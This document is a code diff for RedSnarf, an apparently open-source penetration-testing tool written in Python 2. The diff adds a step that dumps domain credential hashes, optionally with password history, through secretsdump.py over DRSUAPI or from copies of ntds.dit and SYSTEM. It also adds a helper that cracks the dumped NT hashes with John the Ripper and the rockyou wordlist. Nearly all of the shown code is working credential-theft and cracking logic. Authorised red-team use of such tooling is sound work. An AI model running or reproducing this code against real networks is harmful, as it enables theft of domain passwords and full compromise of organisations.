@@ -264,6 +264,16 @@ def gppdecrypt(cpassword_pass):
 	o = AES.new(key, AES.MODE_CBC, "\x00" * 16).decrypt(password)
 	print colored('Your cpassword is '+o[:-ord(o[-1])].decode('utf16'),'green')
 
+def quickjtr(filename):
+	
+	if os.path.isfile("/usr/share/wordlists/rockyou.txt"):		
+		print colored("[+]Found /usr/share/wordlists/rockyou.txt",'green')
+		print colored("[+]Starting John The Ripper - "+"john --format=nt "+str(filename)+ " --wordlist=/usr/share/wordlists/rockyou.txt --rules",'yellow')
+		os.system("john --format=nt "+str(filename)+ " --wordlist=/usr/share/wordlists/rockyou.txt --rules")
+	else:
+		os.system("john --format=nt "+str(filename)+" --rules")
+	
+
 def WriteLAT():
 	try:
 		print colored("[+]Attempting to write Local Account Token Filter Policy ",'green')
@@ -1489,7 +1499,7 @@ def main():
 					print colored ("[+]Found " + find_user + " logged in to "+str(ip),'green')
 
 banner()
-p = argparse.ArgumentParser("./redsnarf -H ip=192.168.0.1 -u administrator -p Password1", version="%prog 0.3d", formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=20,width=150))
+p = argparse.ArgumentParser("./redsnarf -H ip=192.168.0.1 -u administrator -p Password1", version="%prog 0.3e", formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=20,width=150))
 # Creds
 p.add_argument("-H", "--host", dest="host", help="Specify a hostname -H ip= / range -H range= / targets file -H file= to grab hashes from")
 p.add_argument("-u", "--username", dest="username", default="Administrator",help="Enter a username")
@@ -2392,25 +2402,40 @@ if drsuapi in yesanswers:
 					pwdumpmatch = re.compile('^([0-9a-fA-F]{32}):([0-9a-fA-F]{32}):.*?:.*?:\s*$')
 					pwdump = pwdumpmatch.match(passw)
 			
-					if pwdump:
-						passw=passw[0:-3]
-
-					if pwdump:
-						os.system("/usr/local/bin/secretsdump.py -hashes "+passw+' '+domain_name+'/'+user+'\\'+'@'+targets[0] +'> '+outputpath+targets[0]+'/drsuapi_gethashes.txt')
-					else:
-						os.system("/usr/local/bin/secretsdump.py "+domain_name+'/'+user+':'+passw+'\\'+'@'+targets[0] +'> '+outputpath+targets[0]+'/drsuapi_gethashes.txt')
+					response = raw_input("Do you want to extract hashes with history?: Y/(N) ")
+					if response in yesanswers:		
+						if pwdump:
+							os.system("/usr/local/bin/secretsdump.py -history -hashes "+passw+' '+domain_name+'/'+user+'\\'+'@'+targets[0] +'> '+outputpath+targets[0]+'/drsuapi_gethashes.txt')
+						else:
+							os.system("/usr/local/bin/secretsdump.py -history "+domain_name+'/'+user+':'+passw+'\\'+'@'+targets[0] +'> '+outputpath+targets[0]+'/drsuapi_gethashes.txt')
 					
-					if os.path.isfile(outputpath+targets[0]+"/drsuapi_gethashes.txt"):
-						print colored("[+]Found file - completed : "+outputpath+targets[0],'green')
-						hashparse(outputpath+targets[0],'/drsuapi_gethashes.txt')
-				
-						if qldap in yesanswers:
-							print colored("[+]Checking LM User Account Status",'yellow')
-							userstatus(outputpath,targets[0],'lm_usernames.txt')
-							print colored("[+]Checking NT User Account Status",'yellow')
-							userstatus(outputpath,targets[0],'nt_usernames.txt')
-				
-						sys.exit()
+						if os.path.isfile(outputpath+targets[0]+"/drsuapi_gethashes.txt"):
+							print colored("[+]Found file - completed : "+outputpath+targets[0]+"/drsuapi_gethashes.txt",'green')
+						else:
+							print colored("[-]File not Found - Failed : "+outputpath+targets[0]+"/drsuapi_gethashes.txt",'red')
+					else:
+						if pwdump:
+							os.system("/usr/local/bin/secretsdump.py -hashes "+passw+' '+domain_name+'/'+user+'\\'+'@'+targets[0] +'> '+outputpath+targets[0]+'/drsuapi_gethashes.txt')
+						else:
+							os.system("/usr/local/bin/secretsdump.py "+domain_name+'/'+user+':'+passw+'\\'+'@'+targets[0] +'> '+outputpath+targets[0]+'/drsuapi_gethashes.txt')
+
+						if os.path.isfile(outputpath+targets[0]+"/drsuapi_gethashes.txt"):
+							print colored("[+]Found file - completed : "+outputpath+targets[0],'green')
+							hashparse(outputpath+targets[0],'/drsuapi_gethashes.txt')
+					
+							if qldap in yesanswers:
+								print colored("[+]Checking LM User Account Status",'yellow')
+								userstatus(outputpath,targets[0],'lm_usernames.txt')
+								print colored("[+]Checking NT User Account Status",'yellow')
+								userstatus(outputpath,targets[0],'nt_usernames.txt')
+					
+							if os.path.isfile(outputpath+targets[0]+"/nt.txt"):
+								response = raw_input("Do you want to starting cracking the NT hashes with John The Ripper?: Y/(N) ")
+								if response in yesanswers:	
+									quickjtr(outputpath+targets[0]+"/nt.txt")
+
+					sys.exit()
+		
 				else:
 					sys.exit()
 			else:
@@ -2421,22 +2446,38 @@ if drsuapi in yesanswers:
 				if pwdump:
 					passw=passw[0:-3]
 
-				if pwdump:
-					os.system("/usr/local/bin/secretsdump.py -hashes "+passw+' '+domain_name+'/'+user+'\\'+'@'+targets[0] +'> '+outputpath+targets[0]+'/drsuapi_gethashes.txt')
+				response = raw_input("Do you want to extract hashes with history?: Y/(N) ")
+				if response in yesanswers:		
+					if pwdump:
+						os.system("/usr/local/bin/secretsdump.py -history -hashes "+passw+' '+domain_name+'/'+user+'\\'+'@'+targets[0] +'> '+outputpath+targets[0]+'/drsuapi_gethashes.txt')
+					else:
+						os.system("/usr/local/bin/secretsdump.py -history "+domain_name+'/'+user+':'+passw+'\\'+'@'+targets[0] +'> '+outputpath+targets[0]+'/drsuapi_gethashes.txt')
+				
+					if os.path.isfile(outputpath+targets[0]+"/drsuapi_gethashes.txt"):
+						print colored("[+]Found file - completed : "+outputpath+targets[0]+"/drsuapi_gethashes.txt",'green')
+					else:
+						print colored("[-]File not Found - Failed : "+outputpath+targets[0]+"/drsuapi_gethashes.txt",'red')
 				else:
-					os.system("/usr/local/bin/secretsdump.py "+domain_name+'/'+user+':'+passw+'\\'+'@'+targets[0] +'> '+outputpath+targets[0]+'/drsuapi_gethashes.txt')
+					if pwdump:
+						os.system("/usr/local/bin/secretsdump.py -hashes "+passw+' '+domain_name+'/'+user+'\\'+'@'+targets[0] +'> '+outputpath+targets[0]+'/drsuapi_gethashes.txt')
+					else:
+						os.system("/usr/local/bin/secretsdump.py "+domain_name+'/'+user+':'+passw+'\\'+'@'+targets[0] +'> '+outputpath+targets[0]+'/drsuapi_gethashes.txt')
+
+					if os.path.isfile(outputpath+targets[0]+"/drsuapi_gethashes.txt"):
+						print colored("[+]Found file - completed : "+outputpath+targets[0],'green')
+						hashparse(outputpath+targets[0],'/drsuapi_gethashes.txt')
 				
-				if os.path.isfile(outputpath+targets[0]+"/drsuapi_gethashes.txt"):
-					print colored("[+]Found file - completed : "+outputpath+targets[0],'green')
-					hashparse(outputpath+targets[0],'/drsuapi_gethashes.txt')
+						if qldap in yesanswers:
+							print colored("[+]Checking LM User Account Status",'yellow')
+							userstatus(outputpath,targets[0],'lm_usernames.txt')
+							print colored("[+]Checking NT User Account Status",'yellow')
+							userstatus(outputpath,targets[0],'nt_usernames.txt')
 				
-					if qldap in yesanswers:
-						print colored("[+]Checking LM User Account Status",'yellow')
-						userstatus(outputpath,targets[0],'lm_usernames.txt')
-						print colored("[+]Checking NT User Account Status",'yellow')
-						userstatus(outputpath,targets[0],'nt_usernames.txt')
-				
-					sys.exit()
+						if os.path.isfile(outputpath+targets[0]+"/nt.txt"):
+							response = raw_input("Do you want to starting cracking the NT hashes with John The Ripper?: Y/(N) ")
+							if response in yesanswers:	
+								quickjtr(outputpath+targets[0]+"/nt.txt")
+				sys.exit()
 		
 		except OSError:
 			print colored("[-]Something went wrong using the drsuapi method",'red')
@@ -2476,26 +2517,38 @@ if ntds_util in yesanswers:
 			if os.path.isfile(outputpath+targets[0]+'/registry/SYSTEM') and os.path.isfile(outputpath+targets[0]+'/Active Directory/ntds.dit'):	
 				print colored("[+]Found SYSTEM and ntds.dit",'green')
 				print colored("[+]Extracting Hash Database to "+outputpath+targets[0]+'/redsnarf ' +"be patient this may take a minute or two...",'yellow')
-				os.system("/usr/local/bin/secretsdump.py -just-dc-ntlm -system "+outputpath+targets[0]+'/registry/SYSTEM '+ "-ntds "+outputpath+targets[0]+"/Active\ Directory/ntds.dit" +" -outputfile "+outputpath+targets[0]+"/hashdump.txt local")
-				if os.path.isfile(outputpath+targets[0]+'/hashdump.txt.ntds'):
-					print colored("[+]Hashes successfully output to "+outputpath+targets[0]+'/hashdump.txt.ntds','green')
-				else:
-					print colored('[-]Somthing went wrong extracting hashes','red')	
-				print colored("[+]Gathering hash history...",'yellow')	
-				os.system("/usr/local/bin/secretsdump.py -just-dc-ntlm -history -system "+outputpath+targets[0]+'/registry/SYSTEM '+ "-ntds "+outputpath+targets[0]+"/Active\ Directory/ntds.dit" +" -outputfile "+outputpath+targets[0]+"/hashhistoryhashdump.txt local")
-				if os.path.isfile(outputpath+targets[0]+'/hashhistoryhashdump.txt.ntds'):
-					print colored("[+]Hashes successfully output to "+outputpath+targets[0]+'/hashhistoryhashdump.txt.ntds','green')
-				else:
-					print colored('[-]Somthing went wrong extracting hash history','red')
-				if os.path.isfile(outputpath+targets[0]+'/hashdump.txt.ntds'):
-					print colored("[+]Parsing gathered hashes "+outputpath+targets[0]+'/hashdump.txt.ntds','green')
-					hashparse(outputpath+targets[0],'/hashdump.txt.ntds')
-					
-					if qldap in yesanswers:
-						print colored("[+]Checking LM User Account Status",'yellow')
-						userstatus(outputpath,targets[0],'lm_usernames.txt')
-						print colored("[+]Checking NT User Account Status",'yellow')
-						userstatus(outputpath,targets[0],'nt_usernames.txt')
+
+				response = raw_input("Do you want to extract hashes with history?: Y/(N) ")
+				if response in yesanswers:		
+					print colored("[+]Gathering hash history...",'yellow')	
+							
+					os.system("/usr/local/bin/secretsdump.py -just-dc-ntlm -history -system "+outputpath+targets[0]+'/registry/SYSTEM '+ "-ntds "+outputpath+targets[0]+"/Active\ Directory/ntds.dit" +" -outputfile "+outputpath+targets[0]+"/hashhistoryhashdump.txt local")
+					if os.path.isfile(outputpath+targets[0]+'/hashhistoryhashdump.txt.ntds'):
+						print colored("[+]Hashes successfully output to "+outputpath+targets[0]+'/hashhistoryhashdump.txt.ntds','green')
+					else:
+						print colored('[-]Somthing went wrong extracting hash history','red')
+				else:	
+					os.system("/usr/local/bin/secretsdump.py -just-dc-ntlm -system "+outputpath+targets[0]+'/registry/SYSTEM '+ "-ntds "+outputpath+targets[0]+"/Active\ Directory/ntds.dit" +" -outputfile "+outputpath+targets[0]+"/hashdump.txt local")
+					if os.path.isfile(outputpath+targets[0]+'/hashdump.txt.ntds'):
+						print colored("[+]Hashes successfully output to "+outputpath+targets[0]+'/hashdump.txt.ntds','green')
+					else:
+						print colored('[-]Somthing went wrong extracting hashes','red')								
+				
+					#Parse hashes into LM and NT ready for cracking
+					if os.path.isfile(outputpath+targets[0]+'/hashdump.txt.ntds'):
+						print colored("[+]Parsing gathered hashes "+outputpath+targets[0]+'/hashdump.txt.ntds','green')
+						hashparse(outputpath+targets[0],'/hashdump.txt.ntds')
+						#See if we want some extra information about users.
+						if qldap in yesanswers:
+							print colored("[+]Checking LM User Account Status",'yellow')
+							userstatus(outputpath,targets[0],'lm_usernames.txt')
+							print colored("[+]Checking NT User Account Status",'yellow')
+							userstatus(outputpath,targets[0],'nt_usernames.txt')
+
+						if os.path.isfile(outputpath+targets[0]+"/nt.txt"):
+							response = raw_input("Do you want to starting cracking the NT hashes with John The Ripper?: Y/(N) ")
+							if response in yesanswers:	
+								quickjtr(outputpath+targets[0]+"/nt.txt")
 			else:
 				print colored("[-]missing SYSTEM and ntds.dit",'red')
 			sys.exit()		
